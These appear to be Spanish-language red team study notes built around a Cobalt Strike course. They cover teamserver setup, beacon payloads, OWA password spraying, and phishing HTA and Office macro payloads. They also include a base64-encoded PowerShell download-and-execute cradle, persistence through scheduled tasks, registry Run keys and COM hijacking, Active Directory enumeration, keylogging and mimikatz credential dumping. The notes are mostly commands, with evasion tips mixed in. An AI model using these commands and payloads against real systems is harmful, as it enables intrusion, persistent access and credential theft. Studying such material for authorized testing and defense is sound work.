#¿Qué es un RED TEAM?
Red Teaming es el proceso de usar tácticas, técnicas y procedimientos (TTP) para emular una amenaza del mundo real, con el objetivo de medir 
la efectividad de las personas, los procesos y las tecnologías utilizadas para defender un medio ambiente.
No se puede subestimar lo importante que es planificar adecuadamente 
el compromiso del equipo rojo, no solo para lograr buenos resultados, sino para garantizar que todos los involucrados estén protegidos

#¿Qué es OPSEC?
Es un término acuñado originalmente por el ejército de los EE. UU. Y adoptado por la comunidad de seguridad de la información.
Generalmente se usa para describir la "facilidad" con la que las acciones pueden ser observadas por la inteligencia del "enemigo".

#Engagement - Reglas
Definir los objetivos del compromiso.
Defina el (los) objetivo (s) del compromiso, incluidos los dominios y los rangos de IP.
Identifique los requisitos y / o restricciones legales o reglamentarios.
Contiene listas de contactos de emergencia para personas clave en todas las partes.

#CobalStrike
./teamserver ip Password
bash init.sh

#OPSEC-1
OPSEC : Team Server permite que varios clientes se conecten al mismo tiempo.
No exponer el puerto 50050 directamente a Internet. 
En su lugar, se debe utilizar una solución segura de acceso remoto (como un túnel VPN o SSH).

#Listener Management
New Listener
HTTP
SMB
TCP

#Payload
Attack Packages WindowsExecutables(S)
X64
Save

#OPSEC-2
Las cargas útiles por etapas son buenas si su método de entrega limita la cantidad de datos que puede enviar.
Sin embargo, tienden a tener más indicadores en comparación con los sin etapas. Si tienes la opción, ve sin escenario.

#Interacting with Beacon
Intercart
help
help argue
sleep 10

#OPSEC-3
OPSEC : Los tiempos de check-in rápidos pueden aumentar la posibilidad de que se detecte el tráfico de la baliza. 
También puede agregar un jitter para aleatorizar el tiempo de registro en un porcentaje determinado.

inject 1234 x64 http-80

#DNS RECORDS
dig dominio +short
whois ip
dnscan
spoofcheck

#SocialMeida
site:"linkedin.com" empresa

#PasswordSpraying
MailSniper.ps1 Office 365
Invoke-DomainHarvestOWA -ExchHostname ip
namemash.py 
Invoke-UsernameHarvestOWA -ExchHostname ip -Domain Netbios -UserList .\possible-usernames.txt -OutFile valid.txt
Invoke-PasswordSprayOWA -ExchHostname ip -UserList .\valid.txt -Password Summer2021
Get-GlobalAddressList -ExchHostname IP -UserName netbios\iyates -Password Summer2021 -OutFile gal.txt

#OPSEC-4
En el mundo real, tenga en cuenta que estos intentos de autenticación pueden contar para la política de bloqueo de dominio para los usuarios. 
Demasiados intentos en un corto espacio de tiempo no solo son ruidosos, sino que también pueden bloquear las cuentas.

#HTA
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
------------------------------------
Cobal-Attack-Webdrive-by-Scripted Web Delivery (s)
copi to calc
shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://ip/h'))"""
------------------------------------
#MACRO
Sub AutoOpen()
  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"
End Sub

#Phish de HTA
Atacck-Web-drive by -FileHost

#Recon
Setabelt
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user

#Screenshots
screenshot
View > Screenshots

#KeyLogger
keylogger
ViewLogger

#Jobs
jobs
jobkill 1

#HostPersistence
Autorunciones de registro HKCU / HKLM
Tareas programadas
Carpeta de inicio
execute-assembly sharpersist
--------------------------------------
Tareas Programadas Task
Windows
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://ip/payload"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==

Linux
root @ kali: ~ # str = 'IEX ((new-object net.webclient) .downloadstring ("http://ip/payload"))' 
root @ kali: ~ # echo -en $ str | iconv -t UTF-16LE | base 64 -w 0 
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA ==

execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
-------------------------------------
Start Folder
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
-------------------------------------
Ejecución automática del registo
HKCU HKLM
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

COM Hijacking
procmon64.exe
En lugar de secuestrar objetos COM que están en uso y romper
aplicaciones que dependen de ellos, una estrategia más segura es
encontrar instancias de aplicaciones que intentan cargar objetos que en realidad no existe
Oleview.net
Permite la intercomunicación entre componentes de software de diferentes lenguajes
HKEY_ CLASSES_ ROOT\CLSID y HKEY_ CLASSES_ ROOT\Interface
HKEY_ CURRENT_ USER\ Software\Classes
OPeraciones RegOpenKey
NAME NOT FOUND InprocServer32
HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

OTRA FORMAS
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
---------
#DLL
Attack Windowx Executable(s) Windows DLL

#EscaladePrivilegios
execute-assembly 





#POWERVIEW
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powershell Get-Domain
powershell Get-DomainController | select Forest, Name, OSVersion | fl
powershell Get-ForestDomain
powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
powershell Get-DomainOU -Properties Name | sort -Property Name
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
powershell Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
powershell Find-DomainUserLocation | select UserName, SessionFromName
powershell Get-NetSession -ComputerName dc-2 | select CName, UserName
powershell Get-DomainTrust

execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly -d cyberbotic.io

#LATERAL MOVEMENT
jump
remote-exec
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1

netlogons
ps

mimikatz sekurlsa::logonpasswords
mimikatz sekurlsa::ekeys
